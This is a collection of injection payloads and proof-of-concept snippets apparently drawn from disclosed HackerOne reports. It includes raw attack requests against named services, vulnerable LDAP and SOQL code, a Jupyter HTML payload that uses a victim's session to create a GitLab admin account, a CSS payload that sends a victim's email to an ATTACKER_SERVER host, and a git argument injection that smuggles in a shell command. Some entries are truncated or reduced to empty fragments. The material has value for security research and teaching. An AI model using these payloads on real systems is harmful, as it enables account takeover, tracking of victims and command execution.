# Other Injection (LDAP, Format String, Special Elements)  -  curated payloads & PoCs

Snippets extracted from disclosed HackerOne writeups. For authorized testing only.

## 1. [#812907](https://hackerone.com/reports/812907)  -  Bypass voting restriction due to HTTP Header Injection
*medium*

```http
POST /v0/vote HTTP/1.1
Host: api.urbandictionary.com
X-Forwarded-For: 12.34.56.79
Content-Type: application/json; charset=utf-8
Content-Length: 35
Origin: https://hacker.com
Cookie: _ga=GA1.2.47064909.1583578169; _gid=GA1.2.1544677998.1583578169; _urbandictionary_session2=b…

{"defid":12559865,"direction":"up"}
```

## 2. [#906959](https://hackerone.com/reports/906959)  -  [cloudron-surfer] Denial of Service via LDAP Injection
*critical*

```javascript
// https://github.com/nebulade/surfer/blob/master/src/auth.js#L72
// https://git.cloudron.io/cloudron/surfer/-/blob/master/src/auth.js#L74
....

function verifyUser(username, password, callback) {
    if (AUTH_METHOD === 'ldap') {
        var ldapClient = ldapjs.createClient({ url: process.env.CLOUDRON_LDAP_URL });
        ldapClient.on('error', function (error) {
            console.error('LDAP error', error);
        });

        ldapClient.bind(process.env.CLOUDRON_LDAP_BIND_DN, process.env.CLOUDRON_LDAP_BIND_PASSWORD, function (error) {
            if (error) return callback(error);

            var filter = `(|(uid=${username})(mail=${username})(username=${username})(sAMAccountName=${username}))`; //<-- INJECTION: username is not sanitized
            ldapClient.search(process.env.CLOUDRON_LDAP_USERS_BASE_DN, { filter: filter }, function (error, result) {
                if (error) return callback(error);

                var items = [];

                result.on('searchEntry', function(entry) { items.push(entry.object); });
                result.on('error', callback);
                result.on('end', function (result) {
                    if (result.status !== 0 || items.length === 0) return callback('Invalid credentials');

                    // pick the first found
                    var user = items[0];

                    ldapClient.bind(user.dn, password, function (error) {
                        if (error) return callback('Invalid credentials');

                        callback(null, { username: username });
                    });
                });
            });
# … truncated …
```

## 3. [#907311](https://hackerone.com/reports/907311)  -  [meemo-app] Denial of Service via LDAP Injection
*critical*

```javascript
...
exports = module.exports = {
    auth: auth,
    login: login,
    logout: logout,
    profile: profile,

...
// https://github.com/nebulade/meemo/blob/master/src/routes.js#L86
function login(req, res, next) {
    if (typeof req.body.username !== 'string' || !req.body.username) return next(new HttpError(400, 'missing username'));
    if (typeof req.body.password !== 'string' || !req.body.password) return next(new HttpError(400, 'missing password'));

    users.verify(req.body.username, req.body.password, function (error, result) {
        if (error && error.code === UserError.NOT_FOUND) return next(new HttpError(401, 'invalid credentials'));
        if (error && error.code === UserError.NOT_AUTHORIZED) return next(new HttpError(401, 'invalid credentials'));
        if (error) return next(new HttpError(500, error));

        req.session.userId = result.user.username;

        var token = uuid.v4();
        tokens.add(token, '', result.user.username, function (error) {
            if (error) return next(new HttpError(500, error));
            next(new HttpSuccess(201, { token: token, user: result.user }));
        });
    });
}
...
```

## 4. [#1409788](https://hackerone.com/reports/1409788)  -  Arbitrary POST request as victim user from HTML injection in Jupyter notebooks
*high*

```json
{
  "cells": [
    {
      "metadata": { "trusted": true },
      "cell_type": "code",
      "source": "<h1>asd</h1>",
      "execution_count": 1,
      "outputs": [
        {
          "output_type": "display_data",
          "data": {
            "text/plain": "<IPython.core.display.HTML object>",
            "text/html": "<div class=\"js-feature-highlight\" data-dismiss-endpoint=\"https://gitlab.com/api/v4/todos/147611488/mark_as_done\" data-auto-devops-help-path=\"hej\" data-highlight-id=\"1\">asdf</div>\n<div class=\"js-new-user-signups-cap-reached\" data-dismiss-endpoint=\"https://gitlab.com/api/v4/projects/31573768/issues/1/todo\" data-defer-links=\"false\" data-feature-id=\"1\"><button style=\"background-color: rgba(0, 0, 0, 0); border: 0; cursor: default; height: 100%; left: 0; position: absolute; top: 0; width: 100%; z-index: 1000\" class=\"js-close\">hack</button></div>\n"
          },
          "metadata": {}
        }
      ]
    }
  ],
  "metadata": {
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3",
      "language": "python"
    },
    "language_info": {
      "name": "python",
      "version": "3.7.8",
      "mimetype": "text/x-python",
      "codemirror_mode": { "name": "ipython", "version": 3 },
      "pygments_lexer": "ipython3",
      "nbconvert_exporter": "python",
      "file_extension": ".py"
    }
  },
# … truncated …
```

## 5. [#2076786](https://hackerone.com/reports/2076786)  -  Host Header Injection - internal.qa.delivery.indrive.com
*low*

```http
GET / HTTP/1.1
Host: bing.com
```

## 6. [#1039821](https://hackerone.com/reports/1039821)  -  Second-order SOQL injection through email and campaign name parameter in Salesforce lead submission
*low*

```http
POST /leads HTTP/1.1
Host: hackerone.com

campaign_name='&name=A&company_name=B&title=C&phone=D&website=https://e.com
```

## 7. [#1039821](https://hackerone.com/reports/1039821)  -  Second-order SOQL injection through email and campaign name parameter in Salesforce lead submission
*low*

```http
POST /leads HTTP/1.1
Host: hackerone.com
```

## 8. [#745953](https://hackerone.com/reports/745953)  -  Camo Image Proxy Bypass with CSS Escape Sequences
*low*

```http
Put the code mentioned above in your Bio.
```

## 9. [#229498](https://hackerone.com/reports/229498)  -  Host header injection/redirection via newsletter signup
*low*

```http
Post body:
```

## 10. [#1183335](https://hackerone.com/reports/1183335)  -  Object injection in `stripe-billing-typographic` GitHub project via /auth/login
*low*

```http
POST /auth/login

{"email":{"email":1},"password":"1234"}
```

## 11. [#1409788](https://hackerone.com/reports/1409788)  -  Arbitrary POST request as victim user from HTML injection in Jupyter notebooks
*high*

```
<div class=\"js-new-user-signups-cap-reached\" data-dismiss-endpoint=\"https://gitlab.com/api/v4/projects/31573768/issues/1/todo\" data-defer-links=\"false\" data-feature-id=\"1\">
    <button style=\"background-color: rgba(0, 0, 0, 0); border: 0; cursor: default; height: 100%; left: 0; position: absolute; top: 0; width: 100%; z-index: 1000\" class=\"js-close\">
        hack
    </button>
</div>
```

## 12. [#1409788](https://hackerone.com/reports/1409788)  -  Arbitrary POST request as victim user from HTML injection in Jupyter notebooks
*high*

```
"text/html": "<div class=\"js-new-user-signups-cap-reached\" data-dismiss-endpoint=\"https://gitlab.com/api/v4/users?admin=true&email=joaxcarte01@wearehackerone.com&name=just&username=just&password=asdasdasdasd\" data-defer-links=\"false\" data-feature-id=\"1\"><button style=\"background-color: rgba(0, 0, 0, 0); border: 0; cursor: default; height: 100%; left: 0; position: absolute; top: 0; width: 100%; z-index: 1000\" class=\"js-close\">.</button></div>\n"}
```

## 13. [#906959](https://hackerone.com/reports/906959)  -  [cloudron-surfer] Denial of Service via LDAP Injection
*critical*

```
${username}
```

## 14. [#601192](https://hackerone.com/reports/601192)  -  HTML injection in https://interviewing.shopify.com/index.php?candidate=
*low*

```html
<script>[...something...]</script>
```

## 15. [#3590583](https://hackerone.com/reports/3590583)  -  Unquoted body background attribute enables CSS injection that bypasses remote image blocking
*medium*

```css
background-image: url(data:image/png,x);background:url(//ATTACKER_SERVER/track?uid=victim@test.com)
```

## 16. [#229498](https://hackerone.com/reports/229498)  -  Host header injection/redirection via newsletter signup
*low*

```
Host: rewards.www.starbucks.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:53.0) Gecko/20100101 Firefox/53.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://r1otnetsec.herokuapp.com/
X-NewRelic-ID: VQUHVlNSARACV1JSBAIGVA==
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 66
Cookie: ███████
Connection: keep-alive
Pragma: no-cache
Cache-Control: no-cache
```

## 17. [#907311](https://hackerone.com/reports/907311)  -  [meemo-app] Denial of Service via LDAP Injection
*critical*

```javascript
...
function verify(username, password, callback) {
    profile(username, true, function (error, result) {
        if (error) return callback(error);

        if (process.env.CLOUDRON_LDAP_URL) {
            var ldapClient = ldapjs.createClient({ url: process.env.CLOUDRON_LDAP_URL });
            ldapClient.on('error', function (error) {
                console.error('LDAP error', error);
                callback(new UserError(UserError.INTERNAL_ERROR, error));
            });

            var ldapDn = 'cn=' + result.username + ',' + process.env.CLOUDRON_LDAP_USERS_BASE_DN;

            ldapClient.bind(ldapDn, password, function (error) {
                if (error) return callback(new UserError(UserError.NOT_AUTHORIZED));

                callback(null, { user: result });
            });
        } else {
            bcrypt.compare(password, result.passwordHash, function (error, valid) {
                if (error) return callback(new UserError(UserError.INTERNAL_ERROR, error));
                if (!valid) return callback(new UserError(UserError.NOT_AUTHORIZED));

                // strip passwordHash
                delete result.passwordHash;

                callback(null, { user: result });
            });
        }
    });
}

// https://github.com/nebulade/meemo/blob/master/src/users.js#L84
// identifier may be userId, email, username
# … truncated …
```

## 18. [#3590583](https://hackerone.com/reports/3590583)  -  Unquoted body background attribute enables CSS injection that bypasses remote image blocking
*medium*

```html
<!DOCTYPE html>
<html>
<head><title>Quarterly Report</title></head>
<body background="data:image/png,x);background:url(//ATTACKER_SERVER/track?uid=victim@test.com">
<h1>Q4 Financial Summary</h1>
<p>Dear team,</p>
<p>Please find attached the quarterly financial report.</p>
<p>Best regards,<br>Finance Department</p>
</body>
</html>
```

## 19. [#1763704](https://hackerone.com/reports/1763704)  -  Git Arg Injection in  kubernetes-sigs/release-sdk
*low, $100*

```python
package main

import (
	"fmt"
	"github.com/kubernetes-sigs/release-sdk/git"
)

func main() {
	fmt.Println("hello world")

	var result,err = git.LSRemoteExec("--upload-pack=touch${IFS}hack","master")
	if err != nil {
		fmt.Println(err)
	}

fmt.Println(result)

}
```

## 20. [#1039821](https://hackerone.com/reports/1039821)  -  Second-order SOQL injection through email and campaign name parameter in Salesforce lead submission
*low*

```ruby
def find_campaign_id_by_name(campaign_name)
  campaign_record = Salesforce::SalesforceClient.new.soql_query(
    "SELECT Id FROM Campaign WHERE Name = '#{campaign_name}'",
  )&.first

  campaign_record['Id'] unless campaign_record.nil?
end
```

## 21. [#229498](https://hackerone.com/reports/229498)  -  Host header injection/redirection via newsletter signup
*low*

```
Cache-Control: private
Content-Type: application/json; charset=utf-8
Server: Microsoft-IIS/7.5
p3p: CP="CAO PSA OUR"
Set-Cookie: ASP.NET_SessionId=███████; domain=.starbucks.com; path=/; secure; HttpOnly
x-newrelic-app-data: PxQGUlZUDQIJR1NRBAEEVVUDFB9AMQYAZBBZDEtZV0ZaCldOfDdwTSFmdA4IF0pcXAgEEBhhRQkHVEVAJAkRDxJOCEwIFAQcA1EKVgVTBE5UGhVUUlQOBwMgJVQEcwZTIHUUHwQHDxFVPw==
X-Powered-By: ASP.NET
x-frame-options: SAMEORIGIN
Date: Thu, 18 May 2017 02:53:52 GMT
Content-Length: 457
Via: 1.1 sjc1-10
newsletter_signup=pocheaderinjection@gmail.com&newsletter_placement=footer
```
